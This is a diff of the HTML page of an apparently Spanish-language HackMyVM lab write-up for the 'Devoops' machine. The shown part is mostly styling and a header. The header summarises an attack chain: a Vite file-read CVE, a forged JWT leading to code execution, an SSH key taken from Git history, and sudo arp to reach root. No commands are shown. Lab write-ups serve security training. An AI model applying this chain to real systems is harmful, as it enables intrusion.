@@ -1,1138 +1,746 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Devoops — Pentest Report</title>
-  <style>
-    :root {
-      --bg:        #0a0e1a;
-      --surface:   #111827;
-      --surface2:  #1a2540;
-      --border:    #1e2d4a;
-      --accent:    #4ade80;
-      --accent-dim:#16a34a;
-      --accent2:   #7c3aed;
-      --green:     #4ade80;
-      --red:       #f87171;
-      --orange:    #fb923c;
-      --yellow:    #fbbf24;
-      --text:      #e2e8f0;
-      --muted:     #64748b;
-      --code-bg:   #0a0c10;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Devoops — HackMyVM Writeup | Yoandy Ramirez Delgado</title>
+<style>
+  :root {
+    --accent: #4ade80;
+    --accent-dim: #16a34a;
+    --accent-glow: rgba(74,222,128,0.15);
+    --bg: #0a0e1a;
+    --bg2: #0f1629;
+    --bg3: #141d35;
+    --card: #111827;
+    --card2: #1a2540;
+    --border: #1e2d4a;
+    --text: #e2e8f0;
+    --text-muted: #64748b;
+    --text-dim: #94a3b8;
+    --red: #f87171;
+    --yellow: #fbbf24;
+    --blue: #60a5fa;
+    --purple: #a78bfa;
+    --orange: #fb923c;
+    --cyan: #22d3ee;
+    --green: #4ade80;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    font-size: 15px;
+  }
 
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+  /* ─── HERO ─── */
+  .hero {
+    background: linear-gradient(135deg, #0a0e1a 0%, #0d1a2b 40%, #091a10 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 60px 40px 50px;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute; top: -60px; right: -60px;
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(74,222,128,0.07) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero::after {
+    content: '>';
+    position: absolute; bottom: 20px; right: 40px;
+    font-size: 140px; font-family: monospace;
+    color: rgba(74,222,128,0.04); pointer-events: none;
+  }
+  .hero-inner { max-width: 1200px; margin: 0 auto; }
+  .hero-meta { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
+  .tag {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 3px 10px; border-radius: 4px;
+    font-size: 11px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
+  }
+  .tag-platform { background: rgba(74,222,128,0.12); color: var(--accent); border: 1px solid rgba(74,222,128,0.25); }
+  .tag-category { background: rgba(96,165,250,0.1); color: var(--blue); border: 1px solid rgba(96,165,250,0.2); }
+  .tag-diff { background: rgba(74,222,128,0.1); color: var(--green); border: 1px solid rgba(74,222,128,0.2); }
+  .tag-os { background: rgba(251,191,36,0.1); color: var(--yellow); border: 1px solid rgba(251,191,36,0.2); }
+  .hero h1 { font-size: 2.8rem; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 14px; line-height: 1.1; }
+  .hero h1 span { color: var(--accent); }
+  .hero-sub { color: var(--text-dim); font-size: 1.05rem; max-width: 680px; margin-bottom: 28px; line-height: 1.6; }
+  .hero-stats { display: flex; gap: 28px; flex-wrap: wrap; }
+  .stat { display: flex; flex-direction: column; gap: 2px; }
+  .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); }
+  .stat-value { font-size: 1.1rem; font-weight: 700; color: var(--text); }
+  .stat-value.green { color: var(--accent); }
+  .stat-value.red { color: var(--red); }
 
-    body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 15px;
-      line-height: 1.7;
-    }
+  /* ─── LAYOUT ─── */
+  .container { max-width: 1200px; margin: 0 auto; padding: 40px; }
+  .grid { display: grid; grid-template-columns: 1fr 320px; gap: 32px; align-items: start; }
 
-    /* ── HEADER ── */
-    header {
-      background: linear-gradient(135deg, #0a0e1a 0%, #0d1a2b 40%, #091a10 100%);
-      border-bottom: 1px solid var(--border);
-      padding: 0;
-      position: relative;
-      overflow: hidden;
-    }
-    header::before {
-      content: '';
-      position: absolute; inset: 0;
-      background:
-        radial-gradient(ellipse 600px 300px at 70% 50%, rgba(74,222,128,.07) 0%, transparent 70%),
-        radial-gradient(ellipse 400px 400px at 10% 80%, rgba(74,222,128,.04) 0%, transparent 70%);
-      pointer-events: none;
-    }
-    .header-inner {
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 56px 32px 48px;
-      position: relative;
-    }
-    .header-top {
-      display: flex;
-      align-items: flex-start;
-      justify-content: space-between;
-      gap: 24px;
-      flex-wrap: wrap;
-    }
-    .badge-platform {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: rgba(74,222,128,.12);
-      border: 1px solid rgba(74,222,128,.25);
-      color: var(--accent);
-      font-size: 11px;
-      font-weight: 600;
-      letter-spacing: .08em;
-      text-transform: uppercase;
-      padding: 4px 12px;
-      border-radius: 20px;
-      margin-bottom: 14px;
-    }
-    .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); }
-    h1 {
-      font-size: 52px;
-      font-weight: 800;
-      letter-spacing: -.02em;
-      line-height: 1.1;
-      background: linear-gradient(135deg, #fff 30%, #4ade80);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-    .subtitle {
-      color: var(--muted);
-      font-size: 16px;
-      margin-top: 8px;
-    }
-    .header-meta {
-      display: flex;
-      flex-direction: column;
-      align-items: flex-end;
-      gap: 8px;
-    }
-    .status-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: rgba(34,197,94,.1);
-      border: 1px solid rgba(34,197,94,.25);
-      color: var(--green);
-      font-size: 12px;
-      font-weight: 700;
-      letter-spacing: .06em;
-      text-transform: uppercase;
-      padding: 6px 16px;
-      border-radius: 20px;
-    }
-    .pulse {
-      width: 8px; height: 8px; border-radius: 50%;
-      background: var(--green);
-      animation: pulse 2s ease-in-out infinite;
-    }
-    @keyframes pulse {
-      0%,100% { opacity:1; transform:scale(1); }
-      50%      { opacity:.4; transform:scale(.8); }
-    }
-    .meta-row {
-      color: var(--muted);
-      font-size: 13px;
-    }
-    .meta-row span { color: var(--text); font-weight: 600; }
+  /* ─── SIDEBAR ─── */
+  .sidebar { position: sticky; top: 24px; display: flex; flex-direction: column; gap: 20px; }
+  .sidebar-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; }
+  .sidebar-card h4 { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 14px; font-weight: 700; }
+  .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 7px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-label { color: var(--text-muted); }
+  .detail-value { color: var(--text); font-weight: 600; text-align: right; max-width: 160px; }
+  .detail-value.green { color: var(--accent); }
 
-    /* ── STATS BAR ── */
-    .stats-bar {
-      border-top: 1px solid var(--border);
-      display: flex;
-      flex-wrap: wrap;
-    }
-    .stat-cell {
-      flex: 1 1 160px;
-      padding: 20px 32px;
-      border-right: 1px solid var(--border);
-      display: flex;
-      flex-direction: column;
-      gap: 2px;
-    }
-    .stat-cell:last-child { border-right: none; }
-    .stat-label {
-      font-size: 11px;
-      font-weight: 600;
-      letter-spacing: .08em;
-      text-transform: uppercase;
-      color: var(--muted);
-    }
-    .stat-value {
-      font-size: 22px;
-      font-weight: 700;
-      color: var(--text);
-    }
-    .stat-value.critical { color: var(--red); }
-    .stat-value.high     { color: var(--orange); }
-    .stat-value.accent   { color: var(--accent); }
+  .skill-item { margin-bottom: 12px; }
+  .skill-header { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; }
+  .skill-name { color: var(--text-dim); }
+  .skill-pct { color: var(--accent); font-weight: 700; }
+  .skill-bar { height: 5px; background: var(--bg3); border-radius: 3px; overflow: hidden; }
+  .skill-fill { height: 100%; background: linear-gradient(90deg, var(--accent-dim), var(--accent)); border-radius: 3px; }
 
-    /* ── LAYOUT ── */
-    .container {
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 48px 32px;
-    }
-    .grid-2 {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 20px;
-    }
-    @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
+  .tool-list { display: flex; flex-direction: column; gap: 8px; }
+  .tool-item { display: flex; align-items: center; gap: 10px; padding: 8px 10px; border-radius: 6px; background: var(--bg3); border: 1px solid var(--border); font-size: 12px; color: var(--text-dim); }
+  .tool-icon { font-size: 14px; }
 
-    /* ── SECTION ── */
-    .section { margin-bottom: 56px; }
-    .section-label {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: .1em;
-      text-transform: uppercase;
-      color: var(--accent);
-      margin-bottom: 16px;
-    }
-    .section-label::after {
-      content: '';
-      flex: 1;
-      height: 1px;
-      background: linear-gradient(to right, var(--border), transparent);
-    }
-    h2 {
-      font-size: 28px;
-      font-weight: 700;
-      letter-spacing: -.01em;
-      color: #fff;
-      margin-bottom: 20px;
-    }
-    h3 {
-      font-size: 17px;
-      font-weight: 600;
-      color: #fff;
-      margin-bottom: 12px;
-    }
-    p { color: #94a3b8; margin-bottom: 12px; }
-    p:last-child { margin-bottom: 0; }
+  .toc-list { list-style: none; display: flex; flex-direction: column; gap: 2px; }
+  .toc-list li a { display: block; padding: 6px 10px; border-radius: 5px; font-size: 12px; color: var(--text-muted); text-decoration: none; border-left: 2px solid transparent; transition: all 0.15s; }
+  .toc-list li a:hover { color: var(--accent); border-left-color: var(--accent); background: var(--accent-glow); }
 
-    /* ── CARD ── */
-    .card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 24px;
-    }
-    .card-accent-top {
-      border-top: 2px solid var(--accent);
-    }
+  .mitre-list { display: flex; flex-direction: column; gap: 6px; }
+  .mitre-item { display: flex; align-items: flex-start; gap: 8px; padding: 7px 10px; border-radius: 6px; background: var(--bg3); border: 1px solid var(--border); font-size: 11px; }
+  .mitre-id { color: var(--accent); font-family: monospace; font-weight: 700; white-space: nowrap; font-size: 11px; }
+  .mitre-name { color: var(--text-dim); line-height: 1.3; }
 
-    /* ── INFO TABLE ── */
-    .info-table { width: 100%; border-collapse: collapse; }
-    .info-table tr { border-bottom: 1px solid var(--border); }
-    .info-table tr:last-child { border-bottom: none; }
-    .info-table td {
-      padding: 11px 0;
-      font-size: 14px;
-    }
-    .info-table td:first-child {
-      color: var(--muted);
-      font-weight: 600;
-      width: 160px;
-      font-size: 12px;
-      text-transform: uppercase;
-      letter-spacing: .05em;
-    }
-    .info-table td:last-child { color: var(--text); font-family: monospace; }
+  /* ─── MAIN ─── */
+  .section { margin-bottom: 48px; }
+  .section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 22px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+  .section-number { width: 30px; height: 30px; border-radius: 6px; background: var(--accent-glow); border: 1px solid rgba(74,222,128,0.25); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; color: var(--accent); flex-shrink: 0; }
+  .section h2 { font-size: 1.25rem; font-weight: 700; color: var(--text); }
+  .section p { color: var(--text-dim); margin-bottom: 14px; line-height: 1.8; }
+  .section p:last-child { margin-bottom: 0; }
 
-    /* ── PORT TABLE ── */
-    .port-table { width: 100%; border-collapse: collapse; }
-    .port-table th {
-      text-align: left;
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: .08em;
-      text-transform: uppercase;
-      color: var(--muted);
-      padding: 10px 16px;
-      border-bottom: 1px solid var(--border);
-      background: var(--surface2);
-    }
-    .port-table th:first-child { border-radius: 8px 0 0 0; }
-    .port-table th:last-child  { border-radius: 0 8px 0 0; }
-    .port-table td {
-      padding: 12px 16px;
-      font-size: 14px;
-      border-bottom: 1px solid var(--border);
-      vertical-align: top;
-    }
-    .port-table tr:last-child td { border-bottom: none; }
-    .port-table tr:hover td { background: rgba(255,255,255,.02); }
-    .port-num {
-      font-family: 'Cascadia Code', 'Fira Code', monospace;
-      color: var(--accent);
-      font-weight: 700;
-    }
-    .port-state {
-      display: inline-block;
-      padding: 2px 10px;
-      border-radius: 20px;
-      font-size: 11px;
-      font-weight: 700;
-      text-transform: uppercase;
-      background: rgba(34,197,94,.1);
-      border: 1px solid rgba(34,197,94,.2);
-      color: var(--green);
-    }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin-bottom: 16px; }
+  .card h3 { font-size: 0.95rem; font-weight: 700; color: var(--text); margin-bottom: 10px; }
 
-    /* ── VULN CARDS ── */
-    .vuln-card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      overflow: hidden;
-      margin-bottom: 20px;
-    }
-    .vuln-header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 16px;
-      padding: 18px 24px;
-      border-bottom: 1px solid var(--border);
-      flex-wrap: wrap;
-    }
-    .vuln-title-group { display: flex; align-items: center; gap: 12px; }
-    .vuln-number {
-      width: 32px; height: 32px;
-      border-radius: 8px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 13px; font-weight: 700;
-      flex-shrink: 0;
-    }
-    .sev-critical .vuln-number { background: rgba(239,68,68,.15); color: var(--red); }
-    .sev-high     .vuln-number { background: rgba(249,115,22,.15); color: var(--orange); }
-    .sev-medium   .vuln-number { background: rgba(234,179,8,.15);  color: var(--yellow); }
-    .sev-low      .vuln-number { background: rgba(34,197,94,.15);  color: var(--green); }
+  .callout { border-radius: 8px; padding: 16px 18px; margin: 14px 0; display: flex; gap: 12px; align-items: flex-start; font-size: 13.5px; }
+  .callout-info { background: rgba(96,165,250,0.08); border: 1px solid rgba(96,165,250,0.2); }
+  .callout-warn { background: rgba(251,191,36,0.08); border: 1px solid rgba(251,191,36,0.2); }
+  .callout-danger { background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.2); }
+  .callout-tip { background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); }
+  .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .callout-content { color: var(--text-dim); line-height: 1.6; }
+  .callout-content strong { color: var(--text); }
 
-    .sev-critical { border-left: 3px solid var(--red); }
-    .sev-high     { border-left: 3px solid var(--orange); }
-    .sev-medium   { border-left: 3px solid var(--yellow); }
-    .sev-low      { border-left: 3px solid var(--green); }
+  .code-block { background: #050810; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin: 14px 0; font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; }
+  .code-label { background: var(--bg3); border-bottom: 1px solid var(--border); padding: 6px 14px; font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 6px; }
+  .code-label span { color: var(--accent); font-weight: 600; }
+  .code-body { padding: 16px; font-size: 13px; color: #a3e635; overflow-x: auto; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
+  .code-body .comment { color: var(--text-muted); }
+  .code-body .cmd { color: var(--accent); font-weight: 600; }
+  .code-body .param { color: var(--cyan); }
+  .code-body .ip { color: var(--orange); }
+  .code-body .user { color: var(--purple); }
+  .code-body .path { color: var(--blue); }
+  .code-body .highlight { color: var(--red); font-weight: 600; }
 
-    .vuln-name {
-      font-size: 16px; font-weight: 600; color: #fff;
-    }
-    .vuln-cve {
-      font-size: 12px; color: var(--muted);
-      font-family: monospace;
-    }
-    .sev-badge {
-      display: inline-flex; align-items: center; gap: 6px;
-      font-size: 11px; font-weight: 700;
-      letter-spacing: .06em; text-transform: uppercase;
-      padding: 4px 12px; border-radius: 20px;
-      flex-shrink: 0;
-    }
-    .sev-badge.critical { background: rgba(239,68,68,.1); border: 1px solid rgba(239,68,68,.25); color: var(--red); }
-    .sev-badge.high     { background: rgba(249,115,22,.1); border: 1px solid rgba(249,115,22,.25); color: var(--orange); }
-    .sev-badge.medium   { background: rgba(234,179,8,.1);  border: 1px solid rgba(234,179,8,.25);  color: var(--yellow); }
-    .sev-badge.low      { background: rgba(34,197,94,.1);  border: 1px solid rgba(34,197,94,.25);  color: var(--green); }
+  .data-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 14px 0; }
+  .data-table th { background: var(--bg3); color: var(--text-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; text-align: left; }
+  .data-table td { padding: 10px 14px; border: 1px solid var(--border); color: var(--text-dim); vertical-align: top; }
+  .data-table tr:hover td { background: var(--bg3); }
+  .data-table code { font-family: monospace; font-size: 12px; color: var(--accent); background: rgba(74,222,128,0.08); padding: 1px 5px; border-radius: 3px; }
 
-    .vuln-body { padding: 20px 24px; }
-    .vuln-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px;
-      margin-bottom: 16px;
-    }
-    @media (max-width: 640px) { .vuln-grid { grid-template-columns: 1fr; } }
-    .vuln-meta-item { }
-    .vuln-meta-label {
-      font-size: 11px; font-weight: 700;
-      text-transform: uppercase; letter-spacing: .06em;
-      color: var(--muted); margin-bottom: 4px;
-    }
-    .vuln-meta-value { font-size: 14px; color: var(--text); }
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; }
+  .badge-red { background: rgba(248,113,113,0.12); color: var(--red); }
+  .badge-yellow { background: rgba(251,191,36,0.12); color: var(--yellow); }
+  .badge-blue { background: rgba(96,165,250,0.12); color: var(--blue); }
+  .badge-orange { background: rgba(251,146,60,0.12); color: var(--orange); }
+  .badge-purple { background: rgba(167,139,250,0.12); color: var(--purple); }
 
-    /* ── CODE BLOCK ── */
-    .code-block {
-      background: var(--code-bg);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      overflow: hidden;
-      margin: 12px 0;
-    }
-    .code-bar {
-      display: flex; align-items: center;
-      justify-content: space-between;
-      padding: 8px 14px;
-      background: var(--surface2);
-      border-bottom: 1px solid var(--border);
-    }
-    .code-lang {
-      font-size: 11px; font-weight: 600;
-      letter-spacing: .06em; text-transform: uppercase;
-      color: var(--muted);
-    }
-    .code-dots { display: flex; gap: 5px; }
-    .code-dot {
-      width: 10px; height: 10px; border-radius: 50%;
-    }
-    .cd-r { background: #ef4444; }
-    .cd-y { background: #eab308; }
-    .cd-g { background: #22c55e; }
-    .code-block pre {
-      padding: 16px 18px;
-      font-family: 'Cascadia Code', 'Fira Code', 'Courier New', monospace;
-      font-size: 13px;
-      line-height: 1.6;
-      overflow-x: auto;
-      color: #94a3b8;
-      white-space: pre-wrap;
-      word-break: break-all;
-    }
-    .code-block pre .c  { color: var(--accent); }   /* command */
-    .code-block pre .s  { color: var(--green); }    /* string/success */
-    .code-block pre .k  { color: #c084fc; }         /* keyword */
-    .code-block pre .h  { color: var(--orange); }   /* highlight */
-    .code-block pre .m  { color: var(--muted); }    /* muted/comment */
+  .highlight-box { background: var(--card2); border: 1px solid var(--border); border-left: 4px solid var(--accent); border-radius: 8px; padding: 16px 18px; margin: 14px 0; }
+  .highlight-box .label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 6px; font-weight: 700; }
+  .highlight-box .value { font-family: monospace; font-size: 13px; color: var(--text); word-break: break-all; }
 
-    /* ── ATTACK CHAIN ── */
-    .chain {
-      display: flex;
-      flex-direction: column;
-      gap: 0;
-    }
-    .chain-step {
-      display: flex;
-      gap: 20px;
-      position: relative;
-    }
-    .chain-step:not(:last-child)::before {
-      content: '';
-      position: absolute;
-      left: 19px; top: 40px;
-      width: 2px;
-      bottom: 0;
-      background: linear-gradient(to bottom, var(--border), transparent);
-    }
-    .chain-icon {
-      width: 40px; height: 40px;
-      border-radius: 10px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 18px;
-      flex-shrink: 0;
-      background: var(--surface2);
-      border: 1px solid var(--border);
-      z-index: 1;
-    }
-    .chain-content {
-      flex: 1;
-      padding-bottom: 28px;
-    }
-    .chain-step-label {
-      font-size: 11px; font-weight: 700;
-      letter-spacing: .08em; text-transform: uppercase;
-      color: var(--muted); margin-bottom: 4px;
-    }
-    .chain-step-title {
-      font-size: 16px; font-weight: 600; color: #fff;
-      margin-bottom: 8px;
-    }
-    .chain-step-desc { color: #94a3b8; font-size: 14px; }
+  .timeline { position: relative; padding-left: 28px; margin-top: 14px; }
+  .timeline::before { content: ''; position: absolute; left: 9px; top: 8px; bottom: 8px; width: 2px; background: var(--border); }
+  .tl-item { position: relative; margin-bottom: 20px; }
+  .tl-dot { position: absolute; left: -24px; top: 5px; width: 12px; height: 12px; border-radius: 50%; background: var(--bg); border: 2px solid var(--accent); }
+  .tl-dot.red { border-color: var(--red); }
+  .tl-dot.yellow { border-color: var(--yellow); }
+  .tl-dot.orange { border-color: var(--orange); }
+  .tl-dot.blue { border-color: var(--blue); }
+  .tl-dot.purple { border-color: var(--purple); }
+  .tl-time { font-size: 11px; color: var(--text-muted); font-family: monospace; margin-bottom: 2px; }
+  .tl-title { font-size: 0.9rem; font-weight: 700; color: var(--text); margin-bottom: 3px; }
+  .tl-desc { font-size: 12.5px; color: var(--text-dim); line-height: 1.5; }
 
-    /* ── FLAGS ── */
-    .flag-card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 20px 24px;
-      display: flex;
-      align-items: center;
-      gap: 16px;
-    }
-    .flag-icon {
-      font-size: 28px;
-      width: 52px; height: 52px;
-      display: flex; align-items: center; justify-content: center;
-      background: var(--surface2);
-      border-radius: 10px;
-      border: 1px solid var(--border);
-      flex-shrink: 0;
-    }
-    .flag-label {
-      font-size: 11px; font-weight: 700;
-      letter-spacing: .08em; text-transform: uppercase;
-      color: var(--muted); margin-bottom: 4px;
-    }
-    .flag-user { font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 6px; }
-    .flag-value {
-      font-family: 'Cascadia Code', 'Fira Code', monospace;
-      font-size: 13px;
-      color: var(--green);
-      background: rgba(34,197,94,.08);
-      border: 1px solid rgba(34,197,94,.2);
-      border-radius: 6px;
-      padding: 4px 10px;
-      display: inline-block;
-    }
+  .flag-card { display: flex; align-items: flex-start; gap: 14px; background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 10px; }
+  .flag-icon { font-size: 22px; flex-shrink: 0; }
+  .flag-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 3px; font-weight: 700; }
+  .flag-user { font-size: 0.85rem; font-weight: 600; color: var(--text); margin-bottom: 4px; }
+  .flag-value { font-family: monospace; font-size: 12px; color: var(--accent); background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); padding: 3px 8px; border-radius: 4px; word-break: break-all; }
 
-    /* ── CREDS TABLE ── */
-    .creds-table { width: 100%; border-collapse: collapse; }
-    .creds-table th {
-      text-align: left;
-      font-size: 11px; font-weight: 700;
-      letter-spacing: .08em; text-transform: uppercase;
-      color: var(--muted);
-      padding: 10px 14px;
-      border-bottom: 1px solid var(--border);
-      background: var(--surface2);
-    }
-    .creds-table td {
-      padding: 11px 14px;
-      font-size: 13px;
-      border-bottom: 1px solid var(--border);
-      vertical-align: middle;
-    }
-    .creds-table tr:last-child td { border-bottom: none; }
-    .creds-table tr:hover td { background: rgba(255,255,255,.015); }
-    .cred-user {
-      font-weight: 600; color: var(--accent);
-      font-family: monospace;
-    }
-    .cred-pass {
-      font-family: monospace;
-      color: var(--orange);
-    }
-    .cred-method {
-      font-size: 11px; font-weight: 600;
-      padding: 3px 9px; border-radius: 4px;
-      background: rgba(124,58,237,.12);
-      border: 1px solid rgba(124,58,237,.2);
-      color: #c084fc;
-    }
+  .cred-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  .cred-table th { background: var(--bg3); color: var(--text-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; text-align: left; }
+  .cred-table td { padding: 10px 14px; border: 1px solid var(--border); color: var(--text-dim); vertical-align: top; }
+  .cred-table code { font-family: monospace; font-size: 12px; color: var(--accent); }
 
-    /* ── REMEDIATION ── */
-    .remed-item {
-      display: flex; gap: 14px;
-      padding: 16px 0;
-      border-bottom: 1px solid var(--border);
-    }
-    .remed-item:last-child { border-bottom: none; }
-    .remed-num {
-      width: 28px; height: 28px; border-radius: 6px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 12px; font-weight: 700;
-      background: rgba(74,222,128,.1);
-      border: 1px solid rgba(74,222,128,.2);
-      color: var(--accent);
-      flex-shrink: 0;
-    }
-    .remed-title { font-size: 15px; font-weight: 600; color: #fff; margin-bottom: 4px; }
-    .remed-desc  { font-size: 13px; color: #64748b; }
+  .rec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 14px; }
+  .rec-card { background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+  .rec-title { font-size: 0.82rem; font-weight: 700; color: var(--text); margin-bottom: 6px; }
+  .rec-body { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
 
-    /* ── FOOTER ── */
-    footer {
-      border-top: 1px solid var(--border);
-      padding: 24px 32px;
-      text-align: center;
-      font-size: 12px;
-      color: var(--muted);
-    }
-    footer strong { color: var(--accent); }
+  footer { background: var(--bg2); border-top: 1px solid var(--border); padding: 28px 40px; text-align: center; color: var(--text-muted); font-size: 13px; }
+  footer a { color: var(--accent); text-decoration: none; }
+  .footer-name { font-size: 0.95rem; font-weight: 700; color: var(--text); margin-bottom: 4px; }
+  .footer-divider { margin: 0 8px; color: var(--border); }
 
-    /* ── MISC ── */
-    .tag {
-      display: inline-block;
-      font-size: 11px; font-weight: 600;
-      padding: 2px 8px; border-radius: 4px;
-      background: rgba(74,222,128,.1);
-      border: 1px solid rgba(74,222,128,.2);
-      color: var(--accent);
-      margin: 2px;
-    }
-    code {
-      font-family: 'Cascadia Code', 'Fira Code', monospace;
-      font-size: .9em;
-      background: var(--surface2);
-      border: 1px solid var(--border);
-      border-radius: 4px;
-      padding: 1px 6px;
-      color: var(--accent);
-    }
-    .divider {
-      height: 1px;
-      background: linear-gradient(to right, transparent, var(--border), transparent);
-      margin: 40px 0;
-    }
-  </style>
+  @media (max-width: 900px) {
+    .grid { grid-template-columns: 1fr; }
+    .sidebar { position: static; }
+    .hero h1 { font-size: 2rem; }
+    .container { padding: 30px 20px; }
+    .hero { padding: 40px 20px; }
+    .rec-grid { grid-template-columns: 1fr; }
+  }
+</style>
 </head>
 <body>
 
-<!-- ══════════════════════════════ HEADER ══════════════════════════════ -->
-<header>
-  <div class="header-inner">
-    <div class="header-top">
-      <div>
-        <div class="badge-platform"><span class="dot"></span>HackMyVM — CTF Machine</div>
-        <h1>Devoops</h1>
-        <p class="subtitle">Penetration Test Report — Full Chain Compromise</p>
-      </div>
-      <div class="header-meta">
-        <span class="status-badge"><span class="pulse"></span>Pwned</span>
-        <div class="meta-row">Fecha: <span>17 Marzo 2026</span></div>
-        <div class="meta-row">Objetivo: <span>10.0.2.12</span></div>
-        <div class="meta-row">Dificultad: <span>Fácil / Media</span></div>
-      </div>
+<!-- HERO -->
+<header class="hero">
+  <div class="hero-inner">
+    <div class="hero-meta">
+      <span class="tag tag-platform">HackMyVM</span>
+      <span class="tag tag-category">Pentest</span>
+      <span class="tag tag-diff">Fácil / Media</span>
+      <span class="tag tag-os">🐧 Alpine Linux</span>
     </div>
-  </div>
-  <div class="stats-bar">
-    <div class="stat-cell">
-      <span class="stat-label">Puertos Abiertos</span>
-      <span class="stat-value accent">1</span>
-    </div>
-    <div class="stat-cell">
-      <span class="stat-label">Vulnerabilidades</span>
-      <span class="stat-value critical">4</span>
-    </div>
-    <div class="stat-cell">
-      <span class="stat-label">Acceso Inicial</span>
-      <span class="stat-value" style="font-size:14px;padding-top:4px">runner (RCE)</span>
-    </div>
-    <div class="stat-cell">
-      <span class="stat-label">Escalada Final</span>
-      <span class="stat-value" style="font-size:14px;padding-top:4px">root</span>
-    </div>
-    <div class="stat-cell">
-      <span class="stat-label">CVE Principal</span>
-      <span class="stat-value" style="font-size:14px;padding-top:4px">CVE-2025-30208</span>
+    <h1><span>Devoops</span> — Full Chain Compromise</h1>
+    <p class="hero-sub">
+      Máquina Alpine Linux con un servidor de desarrollo Vite 6.2 + Express.js expuesto. La cadena de explotación parte de una vulnerabilidad de lectura arbitraria de ficheros (CVE-2025-30208), pasando por JWT forjado para RCE, recuperación de clave SSH desde el historial Git de Gitea, hasta escalada a root mediante sudo arp (GTFOBins).
+    </p>
+    <div class="hero-stats">
+      <div class="stat"><span class="stat-label">Plataforma</span><span class="stat-value">HackMyVM</span></div>
+      <div class="stat"><span class="stat-label">Objetivo</span><span class="stat-value">10.0.2.12</span></div>
+      <div class="stat"><span class="stat-label">Puertos</span><span class="stat-value green">1</span></div>
+      <div class="stat"><span class="stat-label">Vulnerabilidades</span><span class="stat-value red">4</span></div>
+      <div class="stat"><span class="stat-label">CVE Principal</span><span class="stat-value">CVE-2025-30208</span></div>
+      <div class="stat"><span class="stat-label">Fecha</span><span class="stat-value">17 Mar 2026</span></div>
     </div>
   </div>
 </header>
 
-<!-- ══════════════════════════════ CONTENT ══════════════════════════════ -->
 <div class="container">
+  <div class="grid">
 
